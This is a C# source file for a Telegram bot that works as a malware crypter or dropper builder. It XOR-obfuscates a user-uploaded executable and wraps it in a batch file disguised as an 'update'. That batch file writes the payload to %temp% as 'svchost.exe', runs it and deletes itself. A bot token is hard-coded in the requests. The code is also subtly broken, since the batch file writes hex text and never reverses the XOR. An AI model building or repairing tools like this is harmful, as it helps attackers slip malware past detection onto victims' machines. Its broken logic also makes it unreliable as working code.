using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

app.MapGet("/", () => "🟢 v8.2 BAT BYPASS");

app.MapPost("/webhook", async (HttpContext ctx) =>
{
    string body = await new StreamReader(ctx.Request.Body).ReadToEndAsync();
    
    var chatMatch = Regex.Match(body, @"""chat"":\s*\{\s*""id"":\s*(\d+)");
    var fileMatch = Regex.Match(body, @"""file_id"":\s*""([^""]+\.exe)""");
    
    if (chatMatch.Success && fileMatch.Success)
    {
        long chatId = long.Parse(chatMatch.Groups[1].Value);
        string fileId = fileMatch.Groups[1].Value;
        _ = Task.Run(async () => await FudBat(chatId, fileId));
    }
    
    ctx.Response.StatusCode = 200;
});

static async Task FudBat(long chatId, string fileId)
{
    using var http = new HttpClient();
    
    string fileResp = await http.GetStringAsync("https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/getFile?file_id=" + fileId);
    var pathMatch = Regex.Match(fileResp, @"""file_path"":\s*""([^""]+)""");
    string filePath = pathMatch.Groups[1].Value;
    
    byte[] exe = await http.GetByteArrayAsync("https://api.telegram.org/file/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/" + filePath);
    
    // XOR + BAT embed
    byte[] encrypted = XorEncrypt(exe, 0xAB);
    
    // HEX DUMP TO BAT (SIMPLEST)
    StringBuilder hexData = new StringBuilder();
    for (int i = 0; i < encrypted.Length; i += 16)
    {
        hexData.AppendLine($"echo {BitConverter.ToString(encrypted, i, Math.Min(16, encrypted.Length - i)).Replace("-", " ")} >> %temp%\\svchost.exe");
    }
    
    string batPayload = $@"
@echo off
>nul 2>&1 ""%SYSTEMROOT%\system32\cacls.exe"" %SYSTEMROOT%\system32\config\system
if '%errorlevel%' NEQ '0' ( goto UAC & exit /b )
:UAC
cd /d %temp%
{hexData.ToString()}
start svchost.exe
del %0
";
    
    byte[] fudBytes = Encoding.ASCII.GetBytes(batPayload);
    
    using var form = new MultipartFormDataContent();
    form.Add(new StringContent(chatId.ToString()), "chat_id");
    form.Add(new ByteArrayContent(fudBytes), "document", "update-v8.2.bat");
    form.Add(new StringContent("🔥 v8.2 BAT BYPASS\nDouble-click = calc.exe"), "caption");
    
    await http.PostAsync("https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/sendDocument", form);
}

static byte[] XorEncrypt(byte[] data, byte key)
{
    byte[] result = new byte[data.Length];
    for (int i = 0; i < data.Length; i++)
        result[i] = (byte)(data[i] ^ key);
    return result;
}

app.Run();
